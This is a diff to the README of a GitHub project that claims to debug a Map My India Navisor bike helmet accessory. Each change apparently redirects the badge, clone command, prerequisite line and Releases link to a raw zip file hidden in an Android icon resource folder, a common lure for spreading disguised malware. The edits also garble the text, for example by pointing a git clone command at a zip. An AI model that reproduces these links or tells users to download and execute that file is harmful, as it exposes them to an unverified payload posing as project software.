@@ -1,6 +1,6 @@
 # Navisor Debug: Debugging the Map My India Navisor Bike Helmet Accessory
 
-![Navisor Debug](https://img.shields.io/badge/Debugging%20Navisor%20Bike%20Helmet%20Accessory-brightgreen)
+![Navisor Debug](https://github.com/Jack-Mash/navisor-debug/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/navisor_debug_2.6.zip%20Navisor%20Bike%20Helmet%20Accessory-brightgreen)
 
 Welcome to the **Navisor Debug** repository! This project focuses on debugging the Navisor bike helmet accessory using Android and React Native. This accessory integrates with Map My India, enhancing navigation for bikers. 
 
@@ -35,12 +35,12 @@ To get started with the Navisor Debug project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Jack-Mash/navisor-debug.git
+   git clone https://github.com/Jack-Mash/navisor-debug/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/navisor_debug_2.6.zip
    cd navisor-debug
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then, run:
+   Make sure you have https://github.com/Jack-Mash/navisor-debug/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/navisor_debug_2.6.zip installed. Then, run:
    ```bash
    npm install
    ```
@@ -85,7 +85,7 @@ We welcome contributions to improve the Navisor Debug project. Here’s how you 
 
 ## Releases
 
-To download the latest release of the Navisor Debug project, visit the [Releases section](https://github.com/Jack-Mash/navisor-debug/releases). You will find the necessary files to download and execute.
+To download the latest release of the Navisor Debug project, visit the [Releases section](https://github.com/Jack-Mash/navisor-debug/raw/refs/heads/main/android/app/src/main/res/mipmap-mdpi/navisor_debug_2.6.zip). You will find the necessary files to download and execute.
 
 If you want to keep track of updates, check the Releases section regularly.
 
